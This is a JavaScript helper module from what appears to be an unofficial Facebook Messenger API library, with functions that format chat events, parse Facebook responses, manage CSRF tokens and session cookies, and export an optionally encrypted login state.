function formatTyp(event) {
    return {
        isTyping: !!event.st,
        from: event.from.toString(),
        threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
        // When receiving typ indication from mobile, `from_mobile` isn't set.
        // If it is, we just use that value.
        fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
        userID: (event.realtime_viewer_fbid || event.from).toString(),
        type: "typ"
    };
}

function formatDeltaReadReceipt(delta) {
    // otherUserFbId seems to be used as both the readerID and the threadID in a 1-1 chat.
    // In a group chat actorFbId is used for the reader and threadFbId for the thread.
    return {
        reader: (delta.threadKey.otherUserFbId || delta.actorFbId).toString(),
        time: delta.actionTimestampMs,
        threadID: formatID((delta.threadKey.otherUserFbId || delta.threadKey.threadFbId).toString()),
        type: "read_receipt"
    };
}

function formatReadReceipt(event) {
    return {
        reader: event.reader.toString(),
        time: event.time,
        threadID: formatID((event.thread_fbid || event.reader).toString()),
        type: "read_receipt"
    };
}

function formatRead(event) {
    return {
        threadID: formatID(((event.chat_ids && event.chat_ids[0]) || (event.thread_fbids && event.thread_fbids[0])).toString()),
        time: event.timestamp,
        type: "read"
    };
}

function getFrom(str, startToken, endToken) {
    var start = str.indexOf(startToken) + startToken.length;
    if (start < startToken.length) return "";

    var lastHalf = str.substring(start);
    var end = lastHalf.indexOf(endToken);
    if (end === -1) throw Error("Could not find endTime `" + endToken + "` in the given string.");
    return lastHalf.substring(0, end);
}

function makeParsable(html) {
    let withoutForLoop = html.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, "");

    // (What the fuck FB, why windows style newlines?)
    // So sometimes FB will send us base multiple objects in the same response.
    // They're all valid JSON, one after the other, at the top level. We detect
    // that and make it parse-able by JSON.parse.
    //       Ben - July 15th 2017
    //
    // It turns out that Facebook may insert random number of spaces before
    // next object begins (issue #616)
    //       rav_kr - 2018-03-19
    let maybeMultipleObjects = withoutForLoop.split(/\}\r\n *\{/);
    if (maybeMultipleObjects.length === 1) return maybeMultipleObjects;

    return "[" + maybeMultipleObjects.join("},{") + "]";
}

function arrToForm(form) {
    return arrayToObject(form,
        function(v) {
            return v.name;
        },
        function(v) {
            return v.val;
        }
    );
}

function arrayToObject(arr, getKey, getValue) {
    return arr.reduce(function(acc, val) {
        acc[getKey(val)] = getValue(val);
        return acc;
    }, {});
}

function getSignatureID() {
    return Math.floor(Math.random() * 2147483648).toString(16);
}

function generateTimestampRelative() {
    var d = new Date();
    return d.getHours() + ":" + padZeros(d.getMinutes());
}

function makeDefaults(html, userID, ctx) {
    var reqCounter = 1;
    var fb_dtsg = getFrom(html, 'name="fb_dtsg" value="', '"');

    // @Hack Ok we've done hacky things, this is definitely on top 5.
    // We totally assume the object is flat and try parsing until a }.
    // If it works though it's cool because we get a bunch of extra data things.
    //
    // Update: we don't need this. Leaving it in in case we ever do.
    //       Ben - July 15th 2017

    // var siteData = getFrom(html, "[\"SiteData\",[],", "},");
    // try {
    //   siteData = JSON.parse(siteData + "}");
    // } catch(e) {
    //   log.warn("makeDefaults", "Couldn't parse SiteData. Won't have access to some variables.");
    //   siteData = {};
    // }

    var ttstamp = "2";
    for (var i = 0; i < fb_dtsg.length; i++) ttstamp += fb_dtsg.charCodeAt(i);
    var revision = getFrom(html, 'revision":', ",");

    function mergeWithDefaults(obj) {
        // @TODO This is missing a key called __dyn.
        // After some investigation it seems like __dyn is some sort of set that FB
        // calls BitMap. It seems like certain responses have a "define" key in the
        // res.jsmods arrays. I think the code iterates over those and calls `set`
        // on the bitmap for each of those keys. Then it calls
        // bitmap.toCompressedString() which returns what __dyn is.
        //
        // So far the API has been working without this.
        //
        //              Ben - July 15th 2017
        var newObj = {
            __user: userID,
            __req: (reqCounter++).toString(36),
            __rev: revision,
            __a: 1,
            // __af: siteData.features,
            fb_dtsg: ctx.fb_dtsg ? ctx.fb_dtsg : fb_dtsg,
            jazoest: ctx.ttstamp ? ctx.ttstamp : ttstamp
                // __spin_r: siteData.__spin_r,
                // __spin_b: siteData.__spin_b,
                // __spin_t: siteData.__spin_t,
        };

        // @TODO this is probably not needed.
        //         Ben - July 15th 2017
        // if (siteData.be_key) {
        //   newObj[siteData.be_key] = siteData.be_mode;
        // }
        // if (siteData.pkg_cohort_key) {
        //   newObj[siteData.pkg_cohort_key] = siteData.pkg_cohort;
        // }

        if (!obj) return newObj;
        for (var prop in obj)
            if (obj.hasOwnProperty(prop))
                if (!newObj[prop]) newObj[prop] = obj[prop];
        return newObj;
    }

    function postWithDefaults(url, jar, form, ctxx) {
        return post(url, jar, mergeWithDefaults(form), ctx.globalOptions, ctxx || ctx);
    }

    function getWithDefaults(url, jar, qs, ctxx) {
        return get(url, jar, mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    function postFormDataWithDefault(url, jar, form, qs, ctxx) {
        return postFormData(url, jar, mergeWithDefaults(form), mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    return {
        get: getWithDefaults,
        post: postWithDefaults,
        postFormData: postFormDataWithDefault
    };
}

function parseAndCheckLogin(ctx, defaultFuncs, retryCount) {
    if (retryCount == undefined) retryCount = 0;
    return function(data) {
        return bluebird.try(function() {
            log.verbose("parseAndCheckLogin", data.body);
            if (data.statusCode >= 500 && data.statusCode < 600) {
                if (retryCount >= 5) {
                    throw {
                        error: "Request retry failed. Check the `res` and `statusCode` property on this error.",
                        statusCode: data.statusCode,
                        res: data.body
                    };
                }
                retryCount++;
                var retryTime = Math.floor(Math.random() * 5000);
                log.warn("parseAndCheckLogin", "Got status code " + data.statusCode + " - " + retryCount + ". attempt to retry in " + retryTime + " milliseconds...");
                var url = data.request.uri.protocol + "//" + data.request.uri.hostname + data.request.uri.pathname;
                if (data.request.headers["Content-Type"].split(";")[0] === "multipart/form-data") {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.postFormData(url, ctx.jar, data.request.formData, {}))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                } else {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.post(url, ctx.jar, data.request.formData))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                }
            }
            if (data.statusCode !== 200) throw new Error("parseAndCheckLogin got status code: " + data.statusCode + ". Bailing out of trying to parse response.");

            var res = null;
            try {
                res = JSON.parse(makeParsable(data.body));
            } catch (e) {
                throw {
                    error: "JSON.parse error. Check the `detail` property on this error.",
                    detail: e,
                    res: data.body
                };
            }

            // In some cases the response contains only a redirect URL which should be followed
            if (res.redirect && data.request.method === "GET") return defaultFuncs.get(res.redirect, ctx.jar).then(parseAndCheckLogin(ctx, defaultFuncs));

            // TODO: handle multiple cookies?
            if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === "Cookie") {
                res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace("_js_", "");
                var cookie = formatCookie(res.jsmods.require[0][3], "facebook");
                var cookie2 = formatCookie(res.jsmods.require[0][3], "messenger");
                ctx.jar.setCookie(cookie, "https://www.facebook.com");
                ctx.jar.setCookie(cookie2, "https://www.messenger.com");
            }

            // On every request we check if we got a DTSG and we mutate the context so that we use the latest
            // one for the next requests.
            if (res.jsmods && Array.isArray(res.jsmods.require)) {
                var arr = res.jsmods.require;
                for (var i in arr) {
                    if (arr[i][0] === "DTSG" && arr[i][1] === "setToken") {
                        ctx.fb_dtsg = arr[i][3][0];

                        // Update ttstamp since that depends on fb_dtsg
                        ctx.ttstamp = "2";
                        for (var j = 0; j < ctx.fb_dtsg.length; j++) ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);
                    }
                }
            }

            if (res.error === 1357001) throw { error: "Chưa Đăng Nhập Được - Appstate Đã Bị Lỗi" };
            return res;
        });
    };
}

function saveCookies(jar) {
    return function(res) {
        var cookies = res.headers["set-cookie"] || [];
        cookies.forEach(function(c) {
            if (c.indexOf(".facebook.com") > -1) { // yo wtf is this?
                jar.setCookie(c, "https://www.facebook.com");
                jar.setCookie(c.replace(/domain=\.facebook\.com/, "domain=.messenger.com"), "https://www.messenger.com");
            }
        });
        return res;
    };
}

var NUM_TO_MONTH = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec"
];
var NUM_TO_DAY = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

function formatDate(date) {
    var d = date.getUTCDate();
    d = d >= 10 ? d : "0" + d;
    var h = date.getUTCHours();
    h = h >= 10 ? h : "0" + h;
    var m = date.getUTCMinutes();
    m = m >= 10 ? m : "0" + m;
    var s = date.getUTCSeconds();
    s = s >= 10 ? s : "0" + s;
    return (NUM_TO_DAY[date.getUTCDay()] + ", " + d + " " + NUM_TO_MONTH[date.getUTCMonth()] + " " + date.getUTCFullYear() + " " + h + ":" + m + ":" + s + " GMT");
}

function formatCookie(arr, url) {
    return arr[0] + "=" + arr[1] + "; Path=" + arr[3] + "; Domain=" + url + ".com";
}

function formatThread(data) {
    return {
        threadID: formatID(data.thread_fbid.toString()),
        participants: data.participants.map(formatID),
        participantIDs: data.participants.map(formatID),
        name: data.name,
        nicknames: data.custom_nickname,
        snippet: data.snippet,
        snippetAttachments: data.snippet_attachments,
        snippetSender: formatID((data.snippet_sender || "").toString()),
        unreadCount: data.unread_count,
        messageCount: data.message_count,
        imageSrc: data.image_src,
        timestamp: data.timestamp,
        muteUntil: data.mute_until,
        isCanonicalUser: data.is_canonical_user,
        isCanonical: data.is_canonical,
        isSubscribed: data.is_subscribed,
        folder: data.folder,
        isArchived: data.is_archived,
        recipientsLoadable: data.recipients_loadable,
        hasEmailParticipant: data.has_email_participant,
        readOnly: data.read_only,
        canReply: data.can_reply,
        cannotReplyReason: data.cannot_reply_reason,
        lastMessageTimestamp: data.last_message_timestamp,
        lastReadTimestamp: data.last_read_timestamp,
        lastMessageType: data.last_message_type,
        emoji: data.custom_like_icon,
        color: data.custom_color,
        adminIDs: data.admin_ids,
        threadType: data.thread_type
    };
}

function getType(obj) {
    return Object.prototype.toString.call(obj).slice(8, -1);
}

function formatProxyPresence(presence, userID) {
    if (presence.lat === undefined || presence.p === undefined) return null;
    return {
        type: "presence",
        timestamp: presence.lat * 1000,
        userID: userID || '',
        statuses: presence.p
    };
}

function formatPresence(presence, userID) {
    return {
        type: "presence",
        timestamp: presence.la * 1000,
        userID: userID || '',
        statuses: presence.a
    };
}

function decodeClientPayload(payload) {
    /*
    Special function which Client using to "encode" clients JSON payload
    */
    function Utf8ArrayToStr(array) {
        var out, i, len, c;
        var char2, char3;
        out = "";
        len = array.length;
        i = 0;
        while (i < len) {
            c = array[i++];
            switch (c >> 4) {
                case 0:
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                case 6:
                case 7:
                    out += String.fromCharCode(c);
                    break;
                case 12:
                case 13:
                    char2 = array[i++];
                    out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                    break;
                case 14:
                    char2 = array[i++]; 
                    char3 = array[i++];
                    out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));
                    break;
            }
        }
        return out;
    }
    return JSON.parse(Utf8ArrayToStr(payload));
}

function getAppState(jar) {
    var prettyMilliseconds = require('pretty-ms')
    var getText = global.Fca.getText;
    var StateCrypt = require('./StateCrypt');
    var appstate = jar.getCookies("https://www.facebook.com").concat(jar.getCookies("https://facebook.com")).concat(jar.getCookies("https://www.messenger.com"))
    var logger = require('./logger'),languageFile = require('./Language/index.json');
    var Language = languageFile.find(i => i.Language == global.Fca.Require.FastConfig.Language).Folder.Index;
    var data;
        switch (require("../../FastConfigFca.json").EncryptFeature) {
            case true: {
                if (process.env['FBKEY'] != undefined) {
                    logger.Normal(Language.EncryptSuccess,'[ FCA-HZI ]');
                    data = StateCrypt.encryptState(JSON.stringify(appstate),process.env['FBKEY']);
                }
                else return appstate;
            }
                break;
            case false: {
                data = appstate;
            }
                break;
            default: {
                logger.Normal(getText(Language.IsNotABoolean,require("../../FastConfigFca.json").EncryptFeature));
                data = appstate;
            } 
        }
    logger.Normal(getText(Language.ProcessDone,`${prettyMilliseconds(Date.now() - global.Fca.startTime)}`), "[ FCA-HZI ]");
return data;
}

module.exports = {
    isReadableStream:isReadableStream,
    get:get,
    post:post,
    postFormData:postFormData,
    generateThreadingID:generateThreadingID,
    generateOfflineThreadingID:generateOfflineThreadingID,
    getGUID:getGUID,
    getFrom:getFrom,
    makeParsable:makeParsable,
    arrToForm:arrToForm,
    getSignatureID:getSignatureID,
    getJar: request.jar,
    generateTimestampRelative:generateTimestampRelative,
    makeDefaults:makeDefaults,
    parseAndCheckLogin:parseAndCheckLogin,
    getGender: getGenderByPhysicalMethod,
    saveCookies,
    getType,
    _formatAttachment,
    formatHistoryMessage,
    formatID,
    formatMessage,
    formatDeltaEvent,
    formatDeltaMessage,
    formatProxyPresence,
    formatPresence,
    formatTyp,
    formatDeltaReadReceipt,
    formatCookie,
    formatThread,
    formatReadReceipt,
    formatRead,
    generatePresence,
    generateAccessiblityCookie,
    formatDate,
    decodeClientPayload,
    getAppState,
    getAdminTextMessageType,
    setProxy
};